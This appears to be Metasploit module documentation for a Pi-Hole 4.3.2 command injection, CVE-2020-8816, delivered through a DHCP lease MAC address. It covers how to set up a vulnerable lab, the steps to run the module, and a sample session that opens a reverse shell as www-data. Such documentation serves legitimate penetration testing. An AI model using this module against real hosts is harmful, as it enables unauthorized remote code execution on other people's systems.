## Vulnerable Application

This exploits a command execution in Pi-Hole <= 4.3.2. A new DHCP
static lease is added with a MAC address which includes an RCE.
DHCP server is not required to be running.

Exploitation has many constraints, outlined in the original
[technical writeup](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/).

1. Exploitation requires `/opt/pihole` to be first in the `$PATH` due to
exploitation constraints.
2. Payload must not contain `%00`
3. Payload must be all capital letters

### Setup

Install Pi-Hole [Pi-Hole 4.3](https://github.com/pi-hole/pi-hole/releases/tag/v4.3)
with the following commands:

  ```
  sudo git clone --depth=1 -b v4.3 https://github.com/pi-hole/pi-hole.git /etc/.pihole
  # replace 'git clone' with 'git clone -b v4.3'
  sudo nano /etc/.pihole/automated\ install/basic-install.sh
  sudo ./basic-install.sh
  ```

Pi-Hole attempts to install the latest versions of the software.  Modifying the git clone
command will force it to install the old AdminLTE and Pi-Hole versions.  However this
will make FTL fail to install.

Answer everything with the default.

Lastly, we need to create one file which wasn't made.

```
sudo touch /etc/pihole/GitHubVersions
```

If `/opt/pihole` isn't in the path (for php/lighttp) because the install process wasn't 100% due
to the forcing of version 4.3, edit `/etc/lighttpd/conf-available/15-fastcgi-php.conf` and
add a new item to bin-environment.

```
"PATH" => "opt/pihole:" + env.PATH
```

This will be enough to make it exploitable, however the dashboard won't fully work since some
other components were installed which are too new for it to work with.

If you wish to install FTL, follow the [directions](https://docs.pi-hole.net/ftldns/compile/).

### Cleanup

This will attempt to clean entries in `/etc/dnsmasq.d/04-pihole-static-dhcp.conf`.
However, on failure, `sudo pihole -a removestaticdhcp <MAC>` can be used to remove them.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploit/unix/http/pihole_dhcp_mac_exec```
  4. Do: ```set rhosts```
  4. Do: ```run```
  5. You should get a shell.

## Options

### Password

Password for the web interface.  Randomly set on install.  Use `pihole -a -p` to change/remove it.

## Scenarios

### Pi-Hole 4.3 with AdminLTE 4.3 on Ubuntu 18.04

  ```
  msf5 exploit(unix/http/pihole_dhcp_mac_exec) > exploit
  
  [*] Started reverse TCP double handler on 1.1.1.1:4444 
  [*] Using cookie: PHPSESSID=gh6jsnqloiate3i03f61odtme2;
  [*] Using token: kxpRSBAwsgqwoXLzNy+NJUIvxhZDg6XlgNpgFKWOa1g=
  [+] System env path exploitable: /opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  [*] Payload MAC will be: 95F91DB49D89
  [*] Sending Exploit
  [*] Accepted the first client connection...
  [*] Accepted the second client connection...
  [*] Command: echo Sy32yxZq9xJIjYYz;
  [*] Writing to socket A
  [*] Writing to socket B
  [*] Reading from sockets...
  [*] Reading from socket A
  [*] A: "Sy32yxZq9xJIjYYz\r\n"
  [*] Matching...
  [*] B is input...
  [*] Command shell session 3 opened (1.1.1.1:4444 -> 2.2.2.2:52408) at 2020-05-16 01:04:42 -0400
  [*] Attempting to clean D417DBC0B0BD from config
  [*] Attempting to clean 95F91DB49D89 from config
  
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
